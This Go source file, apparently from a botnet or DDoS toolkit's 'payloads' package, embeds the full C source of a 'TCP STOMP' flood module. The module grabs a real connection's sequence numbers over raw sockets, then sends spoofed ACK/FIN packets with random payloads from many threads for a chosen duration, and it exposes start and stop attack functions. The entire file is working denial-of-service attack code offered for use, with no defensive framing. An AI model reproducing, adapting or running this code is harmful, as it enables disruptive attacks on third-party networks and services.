package payloads

var TCPStomp = `
// ==================== TCP STOMP FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <fcntl.h>

static int tcp_stomp_running = 0;
static pthread_t tcp_stomp_threads[100];

struct stomp_data {
    uint32_t addr;
    uint32_t seq;
    uint32_t ack_seq;
    uint16_t sport;
    uint16_t dport;
};

unsigned short csum_stomp(unsigned short *buf, int count) {
    register unsigned long sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }
    if (count > 0) sum += *(unsigned char *)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short tcpcsum_stomp(struct iphdr *iph, struct tcphdr *tcph, int psize) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr) + psize);
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + psize;
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + psize);
    unsigned short output = csum_stomp(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void *tcp_stomp_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    int length = *(int *)((char *)arg + 72);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_fd < 0) return NULL;
    
    int tmp = 1;
    setsockopt(raw_fd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp));
    
    int tcp_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (tcp_fd < 0) { close(raw_fd); return NULL; }
    
    fcntl(tcp_fd, F_SETFL, O_NONBLOCK);
    connect(tcp_fd, (struct sockaddr *)&sin, sizeof(sin));
    
    struct stomp_data sd;
    char pktbuf[256];
    struct sockaddr_in recv_addr;
    socklen_t recv_len;
    time_t start_recv = time(NULL);
    
    while (time(NULL) - start_recv < 10) {
        recv_len = sizeof(recv_addr);
        int ret = recvfrom(raw_fd, pktbuf, sizeof(pktbuf), 0, (struct sockaddr *)&recv_addr, &recv_len);
        if (ret > sizeof(struct iphdr) + sizeof(struct tcphdr) && recv_addr.sin_addr.s_addr == sin.sin_addr.s_addr) {
            struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));
            if (tcph->source == htons(port) && tcph->syn && tcph->ack) {
                sd.addr = sin.sin_addr.s_addr;
                sd.seq = ntohl(tcph->seq);
                sd.ack_seq = ntohl(tcph->ack_seq);
                sd.sport = tcph->dest;
                sd.dport = port;
                break;
            }
        }
    }
    
    close(tcp_fd);
    
    char datagram[1510];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    char *data = (char *)(tcph + 1);
    
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + length);
    iph->id = htons(rand() & 0xFFFF);
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = 0x0100007f; // localhost
    iph->daddr = sd.addr;
    
    tcph->source = sd.sport;
    tcph->dest = htons(sd.dport);
    tcph->seq = htonl(sd.ack_seq);
    tcph->ack_seq = htonl(sd.seq);
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->fin = 1;
    tcph->window = htons(rand() & 0xFFFF);
    
    time_t start = time(NULL);
    
    while (tcp_stomp_running && time(NULL) - start < duration) {
        for (int i = 0; i < length; i++) data[i] = rand() % 256;
        iph->id = htons(rand() & 0xFFFF);
        iph->check = 0;
        iph->check = csum_stomp((unsigned short *)iph, sizeof(struct iphdr));
        tcph->seq = htonl(ntohl(tcph->seq) + 1);
        tcph->check = 0;
        tcph->check = tcpcsum_stomp(iph, tcph, length);
        sendto(raw_fd, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    
    close(raw_fd);
    return NULL;
}

void start_tcp_stomp_attack(char *target, int port, int threads, int duration_sec, int length) {
    if (tcp_stomp_running) return;
    tcp_stomp_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    *((int *)(arg + 72)) = length;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&tcp_stomp_threads[i], NULL, tcp_stomp_flood, arg);
    }
    
    sleep(duration_sec);
    tcp_stomp_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(tcp_stomp_threads[i], NULL);
    }
    free(arg);
}

void stop_tcp_stomp_attack() { tcp_stomp_running = 0; }
// ==================== END TCP STOMP MODULE ====================
`